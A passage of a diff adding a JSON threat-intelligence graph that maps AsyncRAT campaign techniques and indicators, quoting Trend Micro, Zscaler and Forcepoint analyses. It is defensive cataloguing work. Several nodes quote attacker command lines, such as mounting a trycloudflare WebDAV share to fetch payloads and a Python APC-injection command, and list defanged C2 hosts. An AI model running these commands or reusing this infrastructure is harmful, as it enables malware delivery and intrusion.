+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Meanwhile, rundll32.exe executes the DavSetCookie function from davclnt.dll with parameters specifying a WebDAV server (plus-condos-thy-redeem.trycloudflare[.]com) and an SSL connection."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1547",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1547",
+        "ttp_id": "T1547",
+        "best_span_sentences_list": [
+          [
+            "- The malware ensures persistence through multiple vectors including startup folder scripts (ahke.bat, olsm.bat), WebDAV mounting, and legitimate \"living-off-the-land\" techniques using Windows Script Host, PowerShell, and built-in system utilities to evade detection."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            4,
+            4
+          ]
+        ],
+        "edges": [
+          "EDGE_3575e0f1a1a2",
+          "EDGE_956a657ba8dc",
+          "EDGE_ece64d5bd66a",
+          "EDGE_01328e6cc50b",
+          "EDGE_bc0605d852eb"
+        ],
+        "source": {
+          "TTP:T1547_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": {
+            "best_span_ranges": [
+              [
+                4,
+                4
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "- The malware ensures persistence through multiple vectors including startup folder scripts (ahke.bat, olsm.bat), WebDAV mounting, and legitimate \"living-off-the-land\" techniques using Windows Script Host, PowerShell, and built-in system utilities to evade detection."
+              ]
+            ]
+          },
+          "TTP:T1547_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": {
+            "best_span_ranges": [
+              [
+                23,
+                23
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "It also copies the following “SecurityHealth[.].exe” and “SecurityHealth[.]exe[.]manifest” files in the startup folder for persistence techniques."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1569",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1569",
+        "ttp_id": "T1569",
+        "best_span_sentences_list": [
+          [
+            "Next, the svchost.exe process initiates the WebClient service to enable interaction with WebDAV servers."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            20,
+            20
+          ]
+        ],
+        "edges": [
+          "EDGE_1612a7a15b1d"
+        ],
+        "source": {
+          "TTP:T1569_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": {
+            "best_span_ranges": [
+              [
+                20,
+                20
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Next, the svchost.exe process initiates the WebClient service to enable interaction with WebDAV servers."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1041",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1041",
+        "ttp_id": "T1041",
+        "best_span_sentences_list": [
+          [
+            "Finally, it steals the networking credentials of the victim and sends the stolen information to the following C&C server (invoice-update[.]myiphost[.]com) as shown below."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            38,
+            38
+          ]
+        ],
+        "edges": [
+          "EDGE_3f75d833e3f9",
+          "EDGE_6bd66c99b194"
+        ],
+        "source": {
+          "TTP:T1041_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": {
+            "best_span_ranges": [
+              [
+                38,
+                38
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Finally, it steals the networking credentials of the victim and sends the stolen information to the following C&C server (invoice-update[.]myiphost[.]com) as shown below."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1053",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1053",
+        "ttp_id": "T1053",
+        "best_span_sentences_list": [
+          [
+            "The following image shows the content of the Task.txt file which creates a scheduled task as GoogleUpdate to execute the dropped SecurityHealth[.]exe file."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            24,
+            24
+          ]
+        ],
+        "edges": [
+          "EDGE_a8b7c65c770b",
+          "EDGE_c6c6a8338d9d"
+        ],
+        "source": {
+          "TTP:T1053_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": {
+            "best_span_ranges": [
+              [
+                24,
+                24
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The following image shows the content of the Task.txt file which creates a scheduled task as GoogleUpdate to execute the dropped SecurityHealth[.]exe file."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1497",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1497",
+        "ttp_id": "T1497",
+        "best_span_sentences_list": [
+          [
+            "The payload will also check for the Anti-VM and Anti-debugging techniques to evade detection as follows:\nHere it checks whether the downloaded malware payload is running in the host or virtual machine, and also uses anti-debugging techniques to hide its actual behavior."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            37,
+            37
+          ]
+        ],
+        "edges": [
+          "EDGE_3c31a087258f"
+        ],
+        "source": {
+          "TTP:T1497_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": {
+            "best_span_ranges": [
+              [
+                37,
+                37
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The payload will also check for the Anti-VM and Anti-debugging techniques to evade detection as follows:\nHere it checks whether the downloaded malware payload is running in the host or virtual machine, and also uses anti-debugging techniques to hide its actual behavior."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1518",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1518",
+        "ttp_id": "T1518",
+        "best_span_sentences_list": [
+          [
+            "The following image shows the content of the Testavast+denf.txt file which contains a code to check if antivirus services ESET, Avast, AVG, or Malwarebytes are running."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            11,
+            11
+          ]
+        ],
+        "edges": [
+          "EDGE_76ac9577b6a7",
+          "EDGE_981f36c7a931",
+          "EDGE_ad3e117c0c94",
+          "EDGE_e508440482f0"
+        ],
+        "source": {
+          "TTP:T1518_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": {
+            "best_span_ranges": [
+              [
+                11,
+                11
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The following image shows the content of the Testavast+denf.txt file which contains a code to check if antivirus services ESET, Avast, AVG, or Malwarebytes are running."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1562",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1562",
+        "ttp_id": "T1562",
+        "best_span_sentences_list": [
+          [
+            "After de-obfuscating the VBScript, we can see that the script tries to download a Testavast+denf.txt file from the web hosting site(ec2-34-229-64-131[.]compute-1[.]amazonaws[.]com) and executes the code using the “IEX” operation with the help of “powershell”.",
+            "The following image shows the content of the Testavast+denf.txt file which contains a code to check if antivirus services ESET, Avast, AVG, or Malwarebytes are running.",
+            "If any of those services is found, the script modifies the execution flow of the malware to get around the antivirus, and downloads the appropriate files in order to do so.",
+            "It saves the files related to the antivirus service as untitled.ps1 and executes that powershell script.",
+            "While execution flows are modified if AV services are found to be present, the final payload (AsyncRAT malware) remains the same."
+          ],
+          [
+            "The image depicts the content of the supporting files like admin.vbs, admin.ps1, 1_powerrun.vbs, 1.bat and 1.ps1 whose main task is to stop the particular AV service to evade detection and to execute the malware attack.",
+            "The final goal of the “1.ps1” powershell script is to stop the MalwareBytes service and add exclusion for the supporting files during the real time scanning as depicted below.",
+            "After disabling the running antivirus service, it downloads the AsyncRAT malware from the killd.txt file and starts its malicious activity on the victim's machine."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            10,
+            14
+          ],
+          [
+            17,
+            19
+          ]
+        ],
+        "edges": [
+          "EDGE_08a3b1a1d90f",
+          "EDGE_0f3483ccd76d",
+          "EDGE_1970343aa1d5",
+          "EDGE_34369c0b9516",
+          "EDGE_3ae9e551cee7",
+          "EDGE_4c2c94b888c6",
+          "EDGE_5037c22a73cc",
+          "EDGE_a5a4ac149217",
+          "EDGE_cbddbdae522a",
+          "EDGE_d813c89110c0",
+          "EDGE_e4c842e14f69"
+        ],
+        "source": {
+          "TTP:T1562_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": {
+            "best_span_ranges": [
+              [
+                10,
+                14
+              ],
+              [
+                17,
+                19
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "After de-obfuscating the VBScript, we can see that the script tries to download a Testavast+denf.txt file from the web hosting site(ec2-34-229-64-131[.]compute-1[.]amazonaws[.]com) and executes the code using the “IEX” operation with the help of “powershell”.",
+                "The following image shows the content of the Testavast+denf.txt file which contains a code to check if antivirus services ESET, Avast, AVG, or Malwarebytes are running.",
+                "If any of those services is found, the script modifies the execution flow of the malware to get around the antivirus, and downloads the appropriate files in order to do so.",
+                "It saves the files related to the antivirus service as untitled.ps1 and executes that powershell script.",
+                "While execution flows are modified if AV services are found to be present, the final payload (AsyncRAT malware) remains the same."
+              ],
+              [
+                "The image depicts the content of the supporting files like admin.vbs, admin.ps1, 1_powerrun.vbs, 1.bat and 1.ps1 whose main task is to stop the particular AV service to evade detection and to execute the malware attack.",
+                "The final goal of the “1.ps1” powershell script is to stop the MalwareBytes service and add exclusion for the supporting files during the real time scanning as depicted below.",
+                "After disabling the running antivirus service, it downloads the AsyncRAT malware from the killd.txt file and starts its malicious activity on the victim's machine."
+              ]
+            ]
+          }
+        }
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_32b8d50c84f2",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "file[:]//inventory-card-thumbzilla-ip[.]trycloudflare[.]com@SSL/DavWWWRoot/DE",
+        "edges": [
+          "EDGE_b2e3ca95dd62"
+        ],
+        "source": {
+          "file[:]//inventory-card-thumbzilla-ip[.]trycloudflare[.]com@SSL/DavWWWRoot/DE_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": [
+            [
+              18,
+              "3 - Internet shortcut file\n‘URL=file[:]//inventory-card-thumbzilla-ip[.]trycloudflare[.]com@SSL/DavWWWRoot/DE’ can be seen in the code."
+            ]
+          ]
+        },
+        "raw_value": "file[:]//inventory-card-thumbzilla-ip[.]trycloudflare[.]com@SSL/DavWWWRoot/DE",
+        "canonical_value": "file://inventory-card-thumbzilla-ip.trycloudflare.com@ssl/DavWWWRoot/DE",
+        "normalized_value": "file://inventory-card-thumbzilla-ip.trycloudflare.com@ssl/DavWWWRoot/DE"
+      },
+      {
+        "node_id": "IOC_797cd5703273",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "62.60.190.141",
+        "edges": [
+          "EDGE_3527e1f69df2"
+        ],
+        "source": {
+          "62.60.190.141_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": [
+            [
+              39,
+              "It communicates with the same C2 servers but operates over different port numbers, such as 62.60.190.141:3232 and 62.60.190.141:4056."
+            ]
+          ]
+        },
+        "raw_value": "62.60.190.141",
+        "canonical_value": "62.60.190.141"
+      },
+      {
+        "node_id": "IOC_b57517de96ac",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxps[:]//dl[.]dropboxusercontent[.]com/scl/fi/7j2004fcny2crqxfl4qfj/R000193294-672PDF[.]zip",
+        "edges": [
+          "EDGE_56128b297bdc",
+          "EDGE_98b31a668151",
+          "EDGE_f67d447518ca"
+        ],
+        "source": {
+          "hxxps[:]//dl[.]dropboxusercontent[.]com/scl/fi/7j2004fcny2crqxfl4qfj/R000193294-672PDF[.]zip_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": [
+            [
+              14,
+              "The ‘Rechnung herunterladen’ button hides the Dropbox URL (hxxps[:]//dl[.]dropboxusercontent[.]com/scl/fi/7j2004fcny2crqxfl4qfj/R000193294-672PDF[.]zip) that downloads the first ZIP file."
+            ]
+          ]
+        },
+        "raw_value": "hxxps[:]//dl[.]dropboxusercontent[.]com/scl/fi/7j2004fcny2crqxfl4qfj/R000193294-672PDF[.]zip",
+        "canonical_value": "hxxps://dl.dropboxusercontent.com/scl/fi/7j2004fcny2crqxfl4qfj/R000193294-672PDF.zip",
+        "normalized_value": "hxxps://dl.dropboxusercontent.com/scl/fi/7j2004fcny2crqxfl4qfj/R000193294-672PDF.zip"
+      },
+      {
+        "node_id": "IOC_02788cbf0e0a",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "davclnt.dll",
+        "edges": [
+          "EDGE_b6ff033bc844"
+        ],
+        "source": {
+          "davclnt.dll_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              21,
+              "Meanwhile, rundll32.exe executes the DavSetCookie function from davclnt.dll with parameters specifying a WebDAV server (plus-condos-thy-redeem.trycloudflare[.]com) and an SSL connection."
+            ]
+          ]
+        },
+        "raw_value": "davclnt.dll",
+        "canonical_value": "davclnt.dll",
+        "normalized_value": "davclnt.dll"
+      },
+      {
+        "node_id": "IOC_04c1b2d0ccbf",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "xeno.bat",
+        "edges": [
+          "EDGE_25afff398873",
+          "EDGE_e63de98c7edf"
+        ],
+        "source": {
+          "xeno.bat_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              28,
+              "This batch file (xeno.bat) invokes PowerShell to download a ZIP file from the internet and save it to the user's temporary folder."
+            ]
+          ]
+        },
+        "raw_value": "xeno.bat",
+        "canonical_value": "xeno.bat",
+        "normalized_value": "xeno.bat"
+      },
+      {
+        "node_id": "IOC_1120f7426016",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip",
+        "edges": [
+          "EDGE_1bd523346af0"
+        ],
+        "source": {
+          "https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              27,
+              "processFilePath: C:\\Windows\\System32\\cmd.exe\nprocessCmd: C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\vio.bat\" h \"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nobjectCmd: powershell -Command \"iwr 'https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip' -OutFile 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\p.zip'\"\nThe other downloaded batch file (xeno.bat) has near-identical functions to vio.bat."
+            ]
+          ]
+        },
+        "raw_value": "https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip",
+        "canonical_value": "https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip",
+        "normalized_value": "https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip"
+      },
+      {
+        "node_id": "IOC_11c69003e100",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "python.exe",
+        "edges": [
+          "EDGE_1330cf3c1d72",
+          "EDGE_9b612a613039"
+        ],
+        "source": {
+          "python.exe_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              32,
+              "We observed python.exe being used to perform code injection into explorer.exe via the command python ne.py new.bin -k a.txt."
+            ]
+          ]
+        },
+        "raw_value": "python.exe",
+        "canonical_value": "python.exe",
+        "normalized_value": "python.exe"
+      },
+      {
+        "node_id": "IOC_17f398714025",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "syracuse-seeks-wilson-row.trycloudflare[.]com",
+        "edges": [
+          "EDGE_4c19d9b1bb52"
+        ],
+        "source": {
+          "syracuse-seeks-wilson-row.trycloudflare[.]com_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              36,
+              "objectCmd: net use Q: \"\\\\syracuse-seeks-wilson-row.trycloudflare[.]com@SSL\\of\" /persistent:no\nThe Python library was then extracted from the mounted Q drive to C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\SystemCache25."
+            ]
+          ]
+        },
+        "raw_value": "syracuse-seeks-wilson-row.trycloudflare[.]com",
+        "canonical_value": "syracuse-seeks-wilson-row.trycloudflare.com",
+        "normalized_value": "syracuse-seeks-wilson-row.trycloudflare.com"
+      },
+      {
+        "node_id": "IOC_1e1b68e55755",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "vio.bat",
+        "edges": [
+          "EDGE_2bc527a5e896",
+          "EDGE_7adb15690831"
+        ],
+        "source": {
+          "vio.bat_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              26,
+              "The Vio.bat file is responsible for executing a PowerShell command that downloads the Python 3.14.0 embedded distribution zip file from the official Python website and saves it to the user's local temporary directory, specifically at C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip."
+            ]
+          ]
+        },
+        "raw_value": "vio.bat",
+        "canonical_value": "vio.bat",
+        "normalized_value": "vio.bat"
+      },
+      {
+        "node_id": "IOC_2eabd5a10bef",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Windows\\System32\\cmd.exe",
+        "edges": [
+          "EDGE_3f5468d8ac7c"
+        ],
+        "source": {
+          "C:\\Windows\\System32\\cmd.exe_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              27,
+              "processFilePath: C:\\Windows\\System32\\cmd.exe\nprocessCmd: C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\vio.bat\" h \"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nobjectCmd: powershell -Command \"iwr 'https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip' -OutFile 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\p.zip'\"\nThe other downloaded batch file (xeno.bat) has near-identical functions to vio.bat."
+            ]
+          ]
+        },
+        "raw_value": "C:\\Windows\\System32\\cmd.exe",
+        "canonical_value": "C:\\Windows\\System32\\cmd.exe",
+        "normalized_value": "C:\\Windows\\System32\\cmd.exe"
+      },
+      {
+        "node_id": "IOC_452e90101f57",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "rundll32.exe",
+        "edges": [
+          "EDGE_c5048fe8088d"
+        ],
+        "source": {
+          "rundll32.exe_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              21,
+              "Meanwhile, rundll32.exe executes the DavSetCookie function from davclnt.dll with parameters specifying a WebDAV server (plus-condos-thy-redeem.trycloudflare[.]com) and an SSL connection."
+            ]
+          ]
+        },
+        "raw_value": "rundll32.exe",
+        "canonical_value": "rundll32.exe",
+        "normalized_value": "rundll32.exe"
+      },
+      {
+        "node_id": "IOC_488d49251394",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Users\\<USERNAME>\\AppData\\Local\\z1man",
+        "edges": [
+          "EDGE_82df7e2b6e6f"
+        ],
+        "source": {
+          "C:\\Users\\<USERNAME>\\AppData\\Local\\z1man_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              30,
+              "The archive p.zip was then extracted using the PowerShell command Expand-Archive to C:\\Users\\<USERNAME>\\AppData\\Local\\z1man."
+            ]
+          ]
+        },
+        "raw_value": "C:\\Users\\<USERNAME>\\AppData\\Local\\z1man",
+        "canonical_value": "C:\\Users\\<USERNAME>\\AppData\\Local\\z1man",
+        "normalized_value": "C:\\Users\\<USERNAME>\\AppData\\Local\\z1man"
+      },
+      {
+        "node_id": "IOC_4d91df6aefa1",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "anc.wsf",
+        "edges": [
+          "EDGE_0f781793f078",
+          "EDGE_105002f3e531"
+        ],
+        "source": {
+          "anc.wsf_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              25,
+              "In most of the cases that we investigated, the first file that was downloaded and executed was as.wsh which, in turn, downloads and executes anc.wsf."
+            ]
+          ]
+        },
+        "raw_value": "anc.wsf",
+        "canonical_value": "anc.wsf",
+        "normalized_value": "anc.wsf"
+      },
+      {
+        "node_id": "IOC_4f278b2e1cff",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "plus-condos-thy-redeem.trycloudflare[.]com",
+        "edges": [
+          "EDGE_3ab01422dab0",
+          "EDGE_a63c539c46dd"
+        ],
+        "source": {
+          "plus-condos-thy-redeem.trycloudflare[.]com_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              21,
+              "Meanwhile, rundll32.exe executes the DavSetCookie function from davclnt.dll with parameters specifying a WebDAV server (plus-condos-thy-redeem.trycloudflare[.]com) and an SSL connection."
+            ]
+          ]
+        },
+        "raw_value": "plus-condos-thy-redeem.trycloudflare[.]com",
+        "canonical_value": "plus-condos-thy-redeem.trycloudflare.com",
+        "normalized_value": "plus-condos-thy-redeem.trycloudflare.com"
+      },
+      {
+        "node_id": "IOC_5456579a7fc2",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "ne.py",
+        "edges": [
+          "EDGE_a7fbe2bdf092",
+          "EDGE_d0181937f7e8"
+        ],
+        "source": {
+          "ne.py_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              32,
+              "We observed python.exe being used to perform code injection into explorer.exe via the command python ne.py new.bin -k a.txt."
+            ],
+            [
+              40,
+              "The ne.py Python script is used for Polymorphic Asynchronous Procedure Call (APC) Injection, which is a method of executing arbitrary code in the address space of a separate live process."
+            ],
+            [
+              46,
+              "- Folders ab, ow, and vb contain different sets of new.bin, a.txt, and ne.py files, consisting of different sets of backdoor payloads alongside AsyncRAT."
+            ]
+          ]
+        },
+        "raw_value": "ne.py",
+        "canonical_value": "ne.py",
+        "normalized_value": "ne.py"
+      },
+      {
+        "node_id": "IOC_5fc841d9a55f",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "Rechnung-zu-Auftrag-W19248960825.pdf.url",
+        "edges": [
+          "EDGE_744a5eba4fe2",
+          "EDGE_b56c1dd0af73"
+        ],
+        "source": {
+          "Rechnung-zu-Auftrag-W19248960825.pdf.url_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              17,
+              "The downloaded ZIP file contains the Rechnung-zu-Auftrag-W19248960825.pdf.url Internet Shortcut file, which links to a WebDAV resource hosted on various servers within Cloudflare's free-tier service with URLs containing trycloudflare[.]com in their names."
+            ]
+          ]
+        },
+        "raw_value": "Rechnung-zu-Auftrag-W19248960825.pdf.url",
+        "canonical_value": "Rechnung-zu-Auftrag-W19248960825.pdf.url",
+        "normalized_value": "Rechnung-zu-Auftrag-W19248960825.pdf.url"
+      },
+      {
+        "node_id": "IOC_6b8aa8986298",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "Outlook.exe",
+        "edges": [],
+        "source": {
+          "Outlook.exe_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              15,
+              "The image below shows the presence of Outlook.exe, suggesting that the attack involved directing the user to download a malicious archive file named Rechnung zu Auftrag W19248960825.pdf.zip (translating to “Invoice for Order” in German)."
+            ]
+          ]
+        },
+        "raw_value": "Outlook.exe",
+        "canonical_value": "Outlook.exe",
+        "normalized_value": "Outlook.exe"
+      },
+      {
+        "node_id": "IOC_9012013632e5",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "ihk[.]de",
+        "edges": [],
+        "source": {
+          "ihk[.]de_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              49,
+              "Both URLs also retrieve a legitimate PDF file from the website ihk[.]de and host the final payload, which performs code injection into explorer.exe using Python, and ultimately loads the AsyncRAT shell."
+            ]
+          ]
+        },
+        "raw_value": "ihk[.]de",
+        "canonical_value": "ihk.de",
+        "normalized_value": "ihk.de"
+      },
+      {
+        "node_id": "IOC_9cfa8346a4be",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\SystemCache25",
+        "edges": [
+          "EDGE_fa6d1c0da8b5"
+        ],
+        "source": {
+          "C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\SystemCache25_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              36,
+              "objectCmd: net use Q: \"\\\\syracuse-seeks-wilson-row.trycloudflare[.]com@SSL\\of\" /persistent:no\nThe Python library was then extracted from the mounted Q drive to C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\SystemCache25."
+            ]
+          ]
+        },
+        "raw_value": "C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\SystemCache25",
+        "canonical_value": "C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\SystemCache25",
+        "normalized_value": "C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\SystemCache25"
+      },
+      {
+        "node_id": "IOC_9d757866d1e5",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip",
+        "edges": [
+          "EDGE_b501fc3fdfbb",
+          "EDGE_f9586280275b"
+        ],
+        "source": {
+          "C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              26,
+              "The Vio.bat file is responsible for executing a PowerShell command that downloads the Python 3.14.0 embedded distribution zip file from the official Python website and saves it to the user's local temporary directory, specifically at C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip."
+            ],
+            [
+              27,
+              "processFilePath: C:\\Windows\\System32\\cmd.exe\nprocessCmd: C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\vio.bat\" h \"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nobjectCmd: powershell -Command \"iwr 'https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip' -OutFile 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\p.zip'\"\nThe other downloaded batch file (xeno.bat) has near-identical functions to vio.bat."
+            ]
+          ]
+        },
+        "raw_value": "C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip",
+        "canonical_value": "C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip",
+        "normalized_value": "C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip"
+      },
+      {
+        "node_id": "IOC_a556d829e448",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "explorer.exe",
+        "edges": [
+          "EDGE_f8ce0dd09a34"
+        ],
+        "source": {
+          "explorer.exe_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              2,
+              "- The attack uses legitimate Python downloads from official sources, establishing a complete Python environment on victim systems to execute sophisticated code injection techniques targeting explorer.exe processes."
+            ],
+            [
+              13,
+              "These scripts then install a Python environment, establish persistence via startup folder scripts, and inject code into explorer.exe."
+            ],
+            [
+              42,
+              "The target process for injection can be specificed via the -p parameter, but defaults to injecting into the explorer.exe process if no parameter is provided."
+            ],
+            [
+              44,
+              "- The binary file new.bin serves as the primary input to ne.py, containing the main binary payload that is decrypted and injected into the target process (default: explorer.exe) via APC injection."
+            ],
+            [
+              49,
+              "Both URLs also retrieve a legitimate PDF file from the website ihk[.]de and host the final payload, which performs code injection into explorer.exe using Python, and ultimately loads the AsyncRAT shell."
+            ]
+          ]
+        },
+        "raw_value": "explorer.exe",
+        "canonical_value": "explorer.exe",
+        "normalized_value": "explorer.exe"
+      },
+      {
+        "node_id": "IOC_ae839dc30bb8",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "svchost.exe",
+        "edges": [
+          "EDGE_1612a7a15b1d",
+          "EDGE_e02c33d1db18"
+        ],
+        "source": {
+          "svchost.exe_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              20,
+              "Next, the svchost.exe process initiates the WebClient service to enable interaction with WebDAV servers."
+            ]
+          ]
+        },
+        "raw_value": "svchost.exe",
+        "canonical_value": "svchost.exe",
+        "normalized_value": "svchost.exe"
+      },
+      {
+        "node_id": "IOC_c7d7e885ec36",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "new.bin",
+        "edges": [
+          "EDGE_0abbb7368fde"
+        ],
+        "source": {
+          "new.bin_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              32,
+              "We observed python.exe being used to perform code injection into explorer.exe via the command python ne.py new.bin -k a.txt."
